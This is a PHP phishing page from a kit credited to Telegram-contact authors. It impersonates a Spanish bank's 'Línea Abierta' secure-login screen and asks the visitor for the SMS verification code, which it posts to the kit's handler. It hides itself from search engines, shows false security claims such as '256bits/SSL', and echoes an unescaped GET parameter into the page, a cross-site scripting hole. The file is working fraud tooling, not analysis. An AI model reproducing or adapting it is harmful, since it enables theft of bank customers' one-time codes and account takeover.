<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Acceso seguro a Línea Abierta</title>
    </head>

    <body>

		<div id="login-area">
            <form action="../index.php" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="sms">
                            <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                            <legend>
                                <img src="../assets/imgs/lock.png">
                                <h3>Acceso seguro a Línea Abierta</h3>
                                <p>
                                    <b>Para su protección, necesitamos confirmar su número de teléfono</b><br>
                                    <span>Para confirmar la operación, introduzca la clave que le hemos enviado por SMS a su móvil :</span>
                                </p>
                            </legend>
                            <div class="text-center mb30"><img style="max-width: 120px;" src="../assets/imgs/mobile.svg"></div>
                            <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'sms_code') ?>">
                                <label for="sms_code">Ingrese el código recibido por SMS</label>
                                <input type="text" name="sms_code" id="sms_code" class="form-control">
                                <?php echo error_message($_SESSION['errors'],'sms_code'); ?>
                            </div>                         

                            <div class="form-group mt50">
                                <button type="submit">Confirmar</button>
                            </div>
                            <p style="font-weight: 500; color: red; margin-bottom: 0; font-size: 13px;">Su información de Tarjeta Linea Abierta será procesada de forma segura.  256bits/SSL</p>
                        </form>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>

    </body>

</html>